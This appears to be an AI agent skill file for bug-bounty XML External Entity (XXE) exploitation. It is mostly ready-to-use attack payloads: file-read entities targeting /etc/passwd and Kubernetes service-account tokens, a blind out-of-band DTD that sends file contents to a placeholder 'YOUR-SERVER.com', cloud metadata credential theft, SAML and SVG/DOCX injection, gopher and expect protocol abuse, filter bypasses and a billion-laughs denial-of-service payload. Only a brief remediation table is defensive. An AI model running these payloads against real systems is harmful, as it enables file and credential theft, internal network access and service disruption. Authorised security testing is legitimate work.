name: bug-bounty-xxe
description: >-
  XML External Entity (XXE) injection exploitation for bug bounty. Covers classic
  XXE file disclosure, blind XXE out-of-band exfiltration, error-based XXE, 
  XInclude attacks, cloud metadata access, SSRF via XXE, Kubernetes admission
  webhook exploitation, CI/CD pipeline XXE, and SAML/e-book/infrastructure 
  file format attacks. Based on disclosed HackerOne patterns and real-world
  attack chains. Activates for XML parsing endpoints, SOAP/REST APIs accepting
  XML, file upload features (SVG, DOCX, XLSX), SAML integrations, and any 
  endpoint where Content-Type can be switched to application/xml.
domain: cybersecurity
subdomain: web-application-security
tags:
  - bug-bounty
  - xxe
  - xml-injection
  - file-disclosure
  - out-of-band
  - blind-xxe
  - ssrf
  - saml
  - kubernetes
  - cicd
  - cloud-metadata
  - xinclude
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Bug Bounty XXE Exploitation

## Trigger Keywords

XXE, XML injection, external entity, DTD, file disclosure, blind XXE, out-of-band, SOAP, SVG injection, DOCX exploitation, SAML, XInclude, billion laughs, SSRF via XXE, XML parser

## Input

Confirmation of XML processing at an endpoint: Content-Type accepts application/xml, endpoint returns parsed XML, file upload accepts XML-based formats (SVG, DOCX, XLSX, EPUB), SOAP endpoint detected, or SAML integration found.

## Process

### Step 1: Identify XML Processing Points

```bash
# Content-Type conversion test (most common XXE entry point)
curl -sk -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root>test</root>' \
  -w "\n%{http_code}"

# Test if JSON endpoints also accept XML
curl -sk -X POST "https://target.com/api/data" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><data><key>value</key></data>'

# Check file uploads: SVG, DOCX, XLSX, EPUB
# Upload an SVG with embedded XXE and check for entity resolution in rendered output
# Check SOAP endpoints
curl -sk -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -d '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>hello</test></soap:Body></soap:Envelope>'
```

### Step 2: Test Basic XXE (Classic — file content in response)

```xml
<!-- Test 1: Simple file read via SYSTEM entity -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Test 2: Windows target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>

<!-- Test 3: PHP wrapper (base64-encode source) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

### Step 3: Blind XXE — Out-of-Band Exfiltration

**When no direct output is visible, host a malicious DTD on your server and force the target to call back.**

```bash
# Start your listener (Interactsh or simple HTTP server)
interactsh-client -v

# Step 1: Host this DTD on your server as malicious.dtd
cat > malicious.dtd << 'DTD'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER.com/?data=%file;'>">
%eval;
%exfil;
DTD
# python3 -m http.server 80

# Step 2: Send XXE payload referencing your DTD
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER.com/malicious.dtd">
  %dtd;
]>
<data>test</data>
```

### Step 4: Error-Based XXE (When blind fails)

```xml
<!-- Forces file content into an error message path -->
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<data>test</data>
```

### Step 5: XInclude (When DTD is blocked)

```xml
<!-- Use when <!DOCTYPE is filtered but XML parser still processes XInclude -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

### Step 6: XXE via File Upload Formats

**SVG (profile pictures, document attachments):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

**DOCX/XLSX (unzip, modify, re-zip):**

```bash
unzip document.docx
# Edit word/document.xml — inject XXE
# Re-zip and upload
zip -r exploit.docx *
```

### Step 7: Cloud & Infrastructure XXE

```xml
<!-- AWS IMDSv1 (still present in older environments) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name">]>

<!-- GCP metadata -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>

<!-- Kubernetes service account token (via file://) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">]>

<!-- Kubernetes API via localhost SSRF -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:10250/pods">]>

<!-- Docker socket (via SSRF) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/containers/json" >]>
```

### Step 8: SAML XXE

```xml
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_xxe" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:AuthnRequest>
```

### Step 9: Billion Laughs (DoS PoC — use sparingly)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>
```

## Key Concepts

| Scenario | Technique | Signal |
|----------|-----------|--------|
| Response shows entity content | Classic XXE (SYSTEM entity) | File content rendered in response |
| No response, but outbound possible | Blind XXE (external DTD) | Interactsh/Collaborator callback |
| Blind + outbound blocked | Error-based XXE | File content in error messages |
| DTD blocked | XInclude attack | xi:include with file:// |
| SVG upload profile picture | SVG XXE | Text element renders file content |
| SAML SSO integration | SAML assertion XXE | Issuer/AttributeValue entity |
| Docker/K8s environment | Service account token theft | file:///var/run/secrets/.../token |

## Tools

| Tool | Purpose |
|------|---------|
| **Burp Collaborator** | OOB callback detection for blind XXE |
| **Interactsh** | Self-hosted OOB interaction server |
| **XXEinjector** | Automated XXE exploitation |
| **dtd.gen** | Generate parameter entity DTDs for exfiltration |
| **oxml_sec** | Test XXE in OOXML files (docx, xlsx) |
| **SimpleHTTPServer** | Host malicious DTD files |

## Database-Specific File Paths

```
Linux:
  /etc/passwd          — user list (always readable)
  /etc/hostname        — server hostname (harmless PoC)
  /etc/shadow          — hashed passwords (root only)
  ~/.bash_history      — command history
  /proc/self/environ   — environment variables
  /var/run/secrets/kubernetes.io/serviceaccount/token — K8s token

Windows:
  C:\Windows\win.ini            — classic PoC target
  C:\Windows\System32\drivers\etc\hosts
  C:\inetpub\wwwroot\web.config — IIS config

Java:
  file:///WEB-INF/web.xml
  file:///WEB-INF/classes/application.properties
```

## XXE via Protocol Abuse

```
file:///etc/passwd                    — local file read
php://filter/convert.base64-encode/   — PHP source dump (base64)
gopher://localhost:6379/_INFO         — Redis interaction via SSRF
jar://path/to/file.zip!/internal.txt  — Java archive access
netdoc:///etc/passwd                  — Java alternative to file://
expect://id                           — PHP expect (RCE if enabled)
```

## Bypass Techniques

```xml
<!-- Case variation -->
<!docTypE test [ <!ENTity xxe SYSTEM "file:///etc/passwd"> ]>

<!-- URL encoding -->
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:%2F%2F%2Fetc%2Fpasswd"> ]>

<!-- CDATA wrapping -->
<![CDATA[<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]]>
```

## Remediation

| Language | Secure Configuration |
|----------|---------------------|
| Java | dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true) |
| Python | from defusedxml.ElementTree import fromstring |
| .NET | XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit |
| PHP | libxml_disable_entity_loader(true) + LIBXML_NONET |

## Output

Save to: `./bounty/{program_name}/xxe/XXE_SUMMARY.md`

Successful exploitation produces: file content from target system, cloud metadata credentials, Kubernetes service account tokens, or SSRF to internal services — all usable for privilege escalation or data exfiltration PoC.

```
=== XXE Assessment Summary ===
Target: {target}
Date: {date}

## XXE Points Found
| Endpoint | Parameter | Technique | Impact | Status |
|----------|-----------|-----------|--------|--------|
| /api/upload | XML body | Classic XXE | /etc/passwd read | Confirmed |
| /api/soap | SOAP action | Blind OOB | SSRF to metadata | Working |

## Files Retrieved
| File | Content Summary |
|------|----------------|
| /etc/passwd | root, www-data, deploy |
| /etc/hosts | 10.0.0.x internal IPs |
| /var/www/.env | DB_PASSWORD=masked |

## Blind XXE Callbacks
| Payload | Protocol | Response |
|---------|----------|----------|
| OOB DTD | HTTP | File content received |
| Parameter entity | FTP | File exfiltrated |

## Protocol Abuse via XXE
- file:// reads: /etc/passwd confirmed
- SSRF via XXE: cloud metadata reached
- XInclude: second-order XML parsing

## Next Phase: Exploitation
Feeds into: bug-bounty-exploitation (credential abuse, SSRF chain)
Feeds into: bug-bounty-reporting (XXE PoC, file content screenshots)
```
